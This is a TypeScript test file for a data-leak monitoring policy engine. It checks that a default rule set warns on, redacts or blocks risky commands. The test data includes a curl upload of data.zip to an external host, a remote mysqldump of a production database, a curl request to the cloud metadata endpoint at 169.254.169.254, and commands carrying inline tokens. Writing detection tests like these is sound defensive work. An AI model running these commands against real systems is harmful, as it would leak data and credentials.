/**
 * Data-leak SPL rules tests.
 *
 * Loads the REAL `policies/default-policy.spl.yaml` and evaluates intervention
 * contexts the way RuntimeHook (process_start) and the tool layer (tool_call)
 * build them — including the deriveDataLeakFlags tag injection, so these tests
 * cover the full path from command string to decision. Every assertion here
 * is warn/advisory: no scenario in this file may produce an enforced block
 * under the default policy ( 红线 — 策略过严不得导致生产事故).
 *
 * SPL upgrade: switched from `default-policy.json` to
 * `default-policy.spl.yaml`. §十一 D1 : the
 * 21 historical `enabled:false` rules moved to `policies/legacy.yaml`.
 * `policies/legacy.yaml` removed, this file now
 * loads the full 80 active rules. See `tests/yamlPolicy.test.ts` for
 * the YAML upgrade tests.
 */
import { describe, expect, it, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { normalizeConfig, type Config } from '../src/config.js'
import { InterventionEngine } from '../src/intervention/InterventionEngine.js'
import { deriveDataLeakFlags } from '../src/utils/dataLeakFlags.js'
import { deriveRiskFlags } from '../src/intervention/RuntimeHook.js'

const defaultPolicyPath = fileURLToPath(new URL('../policies/default-policy.spl.yaml', import.meta.url))

function makeEngine(tmpDir: string, policyPath: string = defaultPolicyPath, mode: 'audit' | 'enforce' = 'audit'): InterventionEngine {
  const config: Config = normalizeConfig({
    mode,
    collector: { localOutputPath: join(tmpDir, 'events.jsonl'), flushIntervalMs: 10 },
    intervention: { policyPath, reloadIntervalMs: 0 },
  })
  const engine = new InterventionEngine(config)
  engine.initialize()
  return engine
}

describe('data-leak rules (default policy)', () => {
  let tmpDir: string

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'dsh-datalk-'))
  })

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true })
  })

  it('block-cloud-upload: warns on external upload, stays silent on internal', async () => {
    const engine = makeEngine(tmpDir)
    const external = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveDataLeakFlags('curl -T data.zip https://transfer.example.com/'),
      params: { command: 'curl -T data.zip https://transfer.example.com/' },
    })
    expect(external.decision).toBe('warn')
    expect(external.block_code).toBe('DATA_LEAK_MONITORING_UPLOAD_003')

    const internal = await engine.evaluate({
      // process_start（RuntimeHook 路径）：tool_call/bash 路径下内网地址
      // 上传已由 block-internal-ssrf-command 覆盖（既有行为），这里验证
      // 注入白名单使 warn 规则不叠加误报。
      actionType: 'process_start',
      riskFlags: deriveDataLeakFlags('curl -T build.tar.gz http://10.0.0.1/repo/'),
      params: { command: 'curl -T build.tar.gz http://10.0.0.1/repo/' },
    })
    expect(internal.decision).toBe('allow')
  })

  it('block-data-exfil-db-dump: warns on remote dump, stays silent on local backup', async () => {
    const engine = makeEngine(tmpDir)
    const remote = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveDataLeakFlags('mysqldump --host 10.1.2.3 proddb > dump.sql'),
      params: { command: 'mysqldump --host 10.1.2.3 proddb > dump.sql' },
    })
    expect(remote.decision).toBe('warn')
    expect(remote.block_code).toBe('DATA_LEAK_MONITORING_DB_DUMP_008')

    const local = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveDataLeakFlags('mysqldump --host localhost appdb > backup.sql'),
      params: { command: 'mysqldump --host localhost appdb > backup.sql' },
    })
    expect(local.decision).toBe('allow')
  })

  it('block-data-exfil-db-dump: negative lookahead covers 127.0.0.1 / IPv6 ::1 / [::1] (  收紧)', async () => {
    // The negative-lookahead `(localhost|127\.0\.0\.1|::1)` should also
    // accept the bracketed IPv6 form `[::1]` that libpq / mongosh print
    // for the loopback listener (`host = [::1]` in `pg_hba.conf`).
    const engine = makeEngine(tmpDir)
    const cases = [
      'mysqldump --host=127.0.0.1 appdb > backup.sql',
      'mysqldump --host 127.0.0.1 appdb > backup.sql',
      'pg_dump --host=127.0.0.1 -U postgres appdb > /tmp/backup.sql',
      'mongodump --host ::1 appdb',
      'mongodump --host [::1] appdb',
      'mysqldump --host=localhost appdb',
    ]
    for (const cmd of cases) {
      const d = await engine.evaluate({
        actionType: 'process_start',
        riskFlags: deriveDataLeakFlags(cmd),
        params: { command: cmd },
      })
      expect(d.decision).toBe('allow')
    }
  })

  it('block-cloud-metadata-imds: warns on IMDS access, stays silent on normal requests', async () => {
    const engine = makeEngine(tmpDir)
    // process_start（RuntimeHook 路径）：tool_call/bash 路径的 IMDS 访问
    // 已由启用的 block-internal-ssrf-command 覆盖（enforce 下阻断），本规则
    // 在 audit 下补齐进程层可见性，不重复 tool 层记录。
    const imds = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveRiskFlags({ argv: ['curl', 'http://169.254.169.254/latest/meta-data/'] }),
      params: { command: 'curl http://169.254.169.254/latest/meta-data/' },
    })
    expect(imds.decision).toBe('warn')
    expect(imds.block_code).toBe('DATA_LEAK_MONITORING_IMDS_009')

    const normal = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveRiskFlags({ argv: ['curl', 'https://example.com/health'] }),
      params: { command: 'curl https://example.com/health' },
    })
    expect(normal.decision).toBe('allow')
  })

  it('redact-credentials-exfil: enabled, advisory modify on AKIA body, allow on clean body', async () => {
    const engine = makeEngine(tmpDir)
    const hit = await engine.evaluate({
      actionType: 'http_request',
      params: { host: 'api.example.com', url: 'https://api.example.com/x', method: 'POST' },
      body: 'token=AKIAIOSFODNN7EXAMPLE',
    })
    expect(hit.decision).toBe('modify')
    expect(hit.advisory).toBe(true)
    // blockCode renamed to comply with spec §7.4 naming domain
    // (category-prefix alignment, DATA_DESENSITIZATION_* prefix).
    expect(hit.block_code).toBe('DATA_DESENSITIZATION_REDACT_EXFIL_001')

    const clean = await engine.evaluate({
      actionType: 'http_request',
      params: { host: 'api.example.com', url: 'https://api.example.com/x', method: 'POST' },
      body: '{"orderId":12345}',
    })
    expect(clean.decision).toBe('allow')
  })

  it('warn decisions never block even under enforce mode', async () => {
    const engine = makeEngine(tmpDir, defaultPolicyPath, 'enforce')
    const d = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveDataLeakFlags('curl -T data.zip https://transfer.example.com/'),
      params: { command: 'curl -T data.zip https://transfer.example.com/' },
    })
    expect(d.decision).toBe('warn')
  })
})

describe('block-process-credential-in-command revival', () => {
  let tmpDir: string

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'dsh-datalk-'))
  })

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true })
  })

  it('deriveRiskFlags injects token_in_command (formerly mirrored process_monitor.py; marketplace form runs rule un-finder in tool layer)', () => {
    expect(deriveRiskFlags({ argv: ['curl', '-H', 'Authorization: Bearer abcdef1234567890', 'https://api.example.com'] }))
      .toContain('token_in_command')
    expect(deriveRiskFlags({ argv: ['curl', 'https://example.com/health'] })).not.toContain('token_in_command')
  })

  it('the disabled rule fires when an operator enables it (regression: was dead)', async () => {
    // write a MINIMAL policy containing only the rule
    // under test. Loading the full 79-rule default policy and flipping
    // one rule's `enabled` flag would risk spurious matches from any
    // other enabled rule sharing the same actionType + riskFlag
    // surface — isolation ensures the assertion is meaningful.
    //
    // The minimal policy is hand-written YAML (not a parsed copy of the
    // shipped default-policy.spl.yaml) so the test has no dependency on
    // the `yaml` peerDep — `RuleLoader.parseYaml` handles the YAML via
    // the public loadPolicy() API, which already falls back from
    // `yaml` → `js-yaml` per.
    const minimalPolicy = [
      'apiVersion: security.use/v2',
      'kind: Policy',
      'rules:',
      '  - id: block-process-credential-in-command',
      '    category: data_leak_monitoring',
      '    enabled: true',
      '    priority: 850',
      '    match:',
      '      actionType:',
      '        - process_start',
      '      paramsRegex:',
      '        command:',
      '          - \'curl\\s+--token\\s+\\S+\'',
      '    action:',
      '      decision: block',
      '      blockReason: command carries an inline token',
      '      blockCode: DATA_LEAK_MONITORING_CREDENTIAL_CMD_002',
      '      appealable: false',
      '',
    ].join('\n')

    const policyPath = join(tmpDir, 'minimal-policy.yaml')
    writeFileSync(policyPath, minimalPolicy)

    // `--token` 形态:RuntimeHook 注入 token_in_command,命中被复活的
    // 规则;其它唯一规则是 deny-by-default,所以 block 必然来自此处。
    const command = 'curl --token abcdef1234567890 https://api.example.com'
    const engine = makeEngine(tmpDir, policyPath, 'enforce')
    const d = await engine.evaluate({
      actionType: 'process_start',
      riskFlags: deriveRiskFlags({ argv: ['bash', '-c', command] }),
      params: { command },
    })
    expect(d.decision).toBe('block')
    expect(d.block_code).toBe('DATA_LEAK_MONITORING_CREDENTIAL_CMD_002')
  })
})
